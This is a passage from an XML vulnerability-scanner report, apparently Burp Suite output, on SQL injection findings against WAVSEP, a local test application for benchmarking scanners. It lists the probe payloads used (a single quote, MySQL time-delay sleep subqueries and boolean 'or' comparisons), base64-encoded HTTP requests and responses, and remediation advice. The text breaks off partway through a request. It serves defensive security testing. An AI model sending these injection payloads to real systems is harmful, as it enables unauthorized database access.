    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the orderby parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>,(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcD9vcmRlcmJ5PW1zZ2lkJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTIwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTM4DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhbiBvcmRlciBieSBjbGF1c2UgKGFueSB0eXBlKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoMjAwRXJyb3JzLmpzcD9vcmRlcmJ5PW1zZ2lkJTJjKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjIxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhbiBvcmRlciBieSBjbGF1c2UgKGFueSB0eXBlKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7631028465448173568</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the transactionId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>47161987 or 6256=06256</b> and <b>38676277 or 7577=7579</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3A/dHJhbnNhY3Rpb25JZD0xMzInIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTUxDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU1OjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycgQU5EIHVzZXJJZD0xJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3A/dHJhbnNhY3Rpb25JZD0xMzI0NzE2MTk4NyUyMG9yJTIwNjI1NiUzZDA2MjU2IEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTMyCjwvVEQ+CjxURD4KMTAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3A/dHJhbnNhY3Rpb25JZD0xMzIzODY3NjI3NyUyMG9yJTIwNzU3NyUzZDc1NzkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU2OjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtMjAwRXJyb3IvQ2FzZTA2LUluamVjdGlvbkluVmlldy1OdW1lcmljLVBlcm1pc3Npb25CeXBhc3MtV2l0aDIwMEVycm9ycy5qc3A/dHJhbnNhY3Rpb25JZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC0yMDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzY